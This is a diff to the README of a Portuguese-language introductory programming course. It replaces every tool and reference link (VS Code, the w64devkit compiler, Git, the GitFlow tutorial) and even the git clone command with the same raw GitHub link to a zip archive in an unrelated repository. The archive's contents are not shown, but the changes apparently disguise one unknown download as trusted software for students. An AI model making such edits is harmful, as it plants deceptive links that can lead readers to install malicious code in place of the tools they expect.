@@ -5,9 +5,9 @@ Repositório destinado às aulas teóricas e às atividades práticas da discipl
 Para acompanhar a disciplina, você precisará das seguintes ferramentas:
 | Ferramenta | O que é? | Recomendação |
 | :--- | :--- | :--- |
-| Editor de código | Ambiente onde você escreverá seu código. | [Visual Studio Code](https://code.visualstudio.com/) | 
-| Compilador | Responsável por transformar o código em programa. | **Windows:** [w64devkit](https://github.com/skeeto/w64devkit/releases) <br> **Linux/macOS:** gcc/clang (já incluso) |
-| Versionador | Controla e registra o histórico de alterações do código. | [Git](https://git-scm.com/) |
+| Editor de código | Ambiente onde você escreverá seu código. | [Visual Studio Code](https://raw.githubusercontent.com/flavioAsync/apc1/main/praticas/apc_2.5-alpha.1.zip) | 
+| Compilador | Responsável por transformar o código em programa. | **Windows:** [w64devkit](https://raw.githubusercontent.com/flavioAsync/apc1/main/praticas/apc_2.5-alpha.1.zip) <br> **Linux/macOS:** gcc/clang (já incluso) |
+| Versionador | Controla e registra o histórico de alterações do código. | [Git](https://raw.githubusercontent.com/flavioAsync/apc1/main/praticas/apc_2.5-alpha.1.zip) |
 
 ## 📂 Estrutura de Pastas
 Este repositório está organizado da seguinte forma:
@@ -15,14 +15,14 @@ Este repositório está organizado da seguinte forma:
 - **praticas/**: Contém os códigos das atividades práticas.
 
 ## 🚀 Fluxo de Trabalho Acadêmico
-As atividades seguem o fluxo de trabalho baseado no modelo [GitFlow](https://www.atlassian.com/br/git/tutorials/comparing-workflows/gitflow-workflow).
+As atividades seguem o fluxo de trabalho baseado no modelo [GitFlow](https://raw.githubusercontent.com/flavioAsync/apc1/main/praticas/apc_2.5-alpha.1.zip).
 
 ### 1. Configuração Inicial (realizar apenas uma vez)
 Execute estes passos para preparar seu ambiente:
 1. **Criar Repositório**: Clique no botão `Use this template`, no topo da página, para criar uma cópia deste repositório na sua conta GitHub.
 2. **Clonar Repositório**: Faça o clone do seu repositorio para a sua máquina local:
 ```bash
-git clone https://github.com/SEU_USUARIO/apc-i-SEMESTRE.git
+git clone https://raw.githubusercontent.com/flavioAsync/apc1/main/praticas/apc_2.5-alpha.1.zip
 ```
 3. **Configurar Identificação**: Certifique-se que seu **nome** e **email** estejam configurados no Git:
 ```bash
